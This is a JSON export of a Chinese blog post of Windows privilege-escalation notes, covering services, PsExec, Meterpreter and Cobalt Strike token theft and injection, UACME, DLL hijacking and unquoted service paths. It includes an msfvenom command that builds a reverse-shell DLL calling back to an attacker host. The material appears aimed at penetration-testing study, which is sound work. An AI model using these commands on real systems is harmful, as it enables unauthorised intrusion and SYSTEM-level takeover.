{"title":"权限提升-3-Win提权","uid":"297aecdf16f981e7362544429500ea6b","slug":"权限提升-3","date":"2025-06-02T11:03:21.960Z","updated":"2025-06-03T15:13:41.393Z","comments":true,"path":"api/articles/权限提升-3.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/b13a86ce-15ce-4233-941c-e8b1d7e55d8d.jpg","content":"<h1 id=\"权限提升-3\"><a href=\"#权限提升-3\" class=\"headerlink\" title=\"权限提升-3\"></a>权限提升-3</h1><h2 id=\"Win提权\"><a href=\"#Win提权\" class=\"headerlink\" title=\"Win提权\"></a>Win提权</h2><h3 id=\"服务启动\"><a href=\"#服务启动\" class=\"headerlink\" title=\"服务启动\"></a>服务启动</h3><p>sc是用于与服务控制管理器和服务进行通讯的命令行程序。<br>使用版本:windows 7,10,08,12,16,19,22,早期用at命令<br>1，创建一个名叫syscmd的执行文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sc Create syscmd binPath=&quot;C:\\msf.exe&quot;</span><br></pre></td></tr></table></figure>\n<p>2,运行服务</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sc start syscmd</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Psexec提权\"><a href=\"#Psexec提权\" class=\"headerlink\" title=\"Psexec提权\"></a>Psexec提权</h3><p>（适用于 Win2003 &amp; Win2008）<br>Psexec是Systinternals出品的强大工具，可以让你在远程系统上执行命令<br>下载地址：<br><a href=\"https://download.sysinternals.com/files/PSTools.zip\">https://download.sysinternals.com/files/PSTools.zip</a></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">psexec -i -s -d cmd #以system权限运行cmd</span><br><span class=\"line\">psexec.exe -accepteula -i -s -d cmd.exe #加上-accepteula参数，避免弹出许可协议</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"进程注入\"><a href=\"#进程注入\" class=\"headerlink\" title=\"进程注入\"></a>进程注入</h3><p>MSF：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ps //查看进程</span><br><span class=\"line\">migrate PID //迁移对应PID</span><br></pre></td></tr></table></figure>\n<p>CS:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ps //查看进程</span><br><span class=\"line\">inject PID //注入对应PID</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"令牌窃取\"><a href=\"#令牌窃取\" class=\"headerlink\" title=\"令牌窃取\"></a>令牌窃取</h3><p>MSF：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">use incognito</span><br><span class=\"line\">list_tokens -u</span><br><span class=\"line\">impersonate_token &quot;NT AUTHORITY\\SYSTEM&quot;</span><br></pre></td></tr></table></figure>\n<p>CS:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ps //查看进程</span><br><span class=\"line\">steal_token PID //窃取进程令牌</span><br><span class=\"line\">spawnu PID //窃取进程令牌上线</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"UAC绕过\"><a href=\"#UAC绕过\" class=\"headerlink\" title=\"UAC绕过\"></a>UAC绕过</h3><p>1，MSF模块</p>\n<p>2，UACME项目<br><a href=\"https://github.com/hfiref0x/UACME\">https://github.com/hfiref0x/UACME</a><br>Akagi64.exe 编号 调用执行</p>\n<h3 id=\"DLL劫持\"><a href=\"#DLL劫持\" class=\"headerlink\" title=\"DLL劫持\"></a>DLL劫持</h3><p>在掌握的权限中，需要知道有哪些应用，应用知道后怎么分析调用的dll，尝试对dll文件进行覆盖，程序被执行后就会调用覆盖的dll</p>\n<p>原理：Windows程序启动的时候需要DLL。如果这些DLL不存在，则通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定好的搜索DLL的路径，它会根据下面顺序进行搜索：<br>1，应用程序加载的目录<br>2，C:\\Windows\\System32<br>3，C:\\Windows\\System<br>4，C:\\Windows<br>5，当前工作目录Currnet Working Directory，CWD<br>6，在PATH环境变量的目录（先系统后用户）<br>过程：信息收集-进程调试-制作dll并上传-替换dll-等待启动应用成功<br>检测调用的dll文件：ChkDllHijack 火绒剑<br>项目：<a href=\"https://github.com/anhkgg/anhkgg-tools\">https://github.com/anhkgg/anhkgg-tools</a><br>利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。<br>msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;xx.xx.xx.xx  lport&#x3D;xx -f dll -o msf.dll<br>将msf.dll替换成应用程序调用的dll文件，后重新启动应用（更偏向于钓鱼）</p>\n<h3 id=\"未引导号路径\"><a href=\"#未引导号路径\" class=\"headerlink\" title=\"未引导号路径\"></a>未引导号路径</h3><p>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的！<br>漏洞原理<br>假设服务路径是：C:\\Program Files (x86)\\Common Files\\Tencent\\QQMusic\\QQMusicService.exe</p>\n<ul>\n<li>带引号时： “C:\\Program Files (x86)\\Common Files\\Tencent\\QQMusic\\QQMusicService.exe”会被看成一个完整的服务路径，没有漏洞。</li>\n<li>不带引号时： Windows会认为C:\\Program空格后面的为Program这个程序的参数，导致攻击者可以创建一个名为Program.exe的后门文件放在C盘下，等待服务启动时执行。<br>漏洞检测<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</span><br></pre></td></tr></table></figure></li>\n</ul>\n<h3 id=\"可控服务\"><a href=\"#可控服务\" class=\"headerlink\" title=\"可控服务\"></a>可控服务</h3>","text":"权限提升-3Win提权服务启动sc是用于与服务控制管理器和服务进行通讯的命令行程序。使用版本:windows 7,10,08,12,16,19,22,早期用at...","permalink":"/post/权限提升-3","photos":[],"count_time":{"symbolsCount":"1.8k","symbolsTime":"2 mins."},"categories":[{"name":"Win权限提升","slug":"Win权限提升","count":1,"path":"api/categories/Win权限提升.json"}],"tags":[{"name":"Win提升","slug":"Win提升","count":1,"path":"api/tags/Win提升.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-3\"><span class=\"toc-text\">权限提升-3</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#Win%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">Win提权</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8\"><span class=\"toc-text\">服务启动</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#Psexec%E6%8F%90%E6%9D%83\"><span class=\"toc-text\">Psexec提权</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5\"><span class=\"toc-text\">进程注入</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96\"><span class=\"toc-text\">令牌窃取</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#UAC%E7%BB%95%E8%BF%87\"><span class=\"toc-text\">UAC绕过</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#DLL%E5%8A%AB%E6%8C%81\"><span class=\"toc-text\">DLL劫持</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%9C%AA%E5%BC%95%E5%AF%BC%E5%8F%B7%E8%B7%AF%E5%BE%84\"><span class=\"toc-text\">未引导号路径</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E5%8F%AF%E6%8E%A7%E6%9C%8D%E5%8A%A1\"><span class=\"toc-text\">可控服务</span></a></li></ol></li></ol></li></ol>","author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}},"mapped":true,"hidden":false,"prev_post":{"title":"linux提权-1","uid":"2eb261c391a60e94d2f9b69f931a84fb","slug":"linux提权-1","date":"2025-06-03T15:12:37.974Z","updated":"2025-06-04T16:29:54.096Z","comments":true,"path":"api/articles/linux提权-1.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/a76060269e0619c044dc392a6fc9b999.jpg","text":"linux提权-1《Linux提权方法论》https://github.com/Getshell/LinuxTQ提权网站：https://gtfobins.gi...","permalink":"/post/linux提权-1","photos":[],"count_time":{"symbolsCount":"6.2k","symbolsTime":"6 mins."},"categories":[{"name":"linux提权","slug":"linux提权","count":2,"path":"api/categories/linux提权.json"}],"tags":[{"name":"linux提权","slug":"linux提权","count":2,"path":"api/tags/linux提权.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}}},"next_post":{"title":"权限提升-2","uid":"0f8abd92b0e73165bbd05c82bb1708c5","slug":"权限提升-2","date":"2025-06-01T09:03:06.779Z","updated":"2025-06-01T16:52:07.344Z","comments":true,"path":"api/articles/权限提升-2.json","cover":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/c41ba1b1-fb0a-4372-b48a-06427e3a6734.jpg","text":"权限提升-2数据库提权数据库提权流程： 1、先获取到数据库用户密码 网站存在SQL注入漏洞 数据库的存储文件或备份文件 网站应用源码中的数据库配置文件 采用工具...","permalink":"/post/权限提升-2","photos":[],"count_time":{"symbolsCount":"1.9k","symbolsTime":"2 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":2,"path":"api/categories/权限提升.json"}],"tags":[{"name":"权限提升","slug":"权限提升","count":2,"path":"api/tags/权限提升.json"}],"author":{"name":"Hao","slug":"blog-author","avatar":"https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/64966b30e1c9375e8dbb11146ea9c12f.jpg","link":"/","description":"山高自有客行路，水深自有渡船认 The future is like the sea and three will be a long time to come","socials":{"github":"https://github.com/isMyHao","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"https://www.zhihu.com/","csdn":"https://blog.csdn.net/2401_87971103?spm=1000.2115.3001.10640","juejin":"","customs":{}}}}}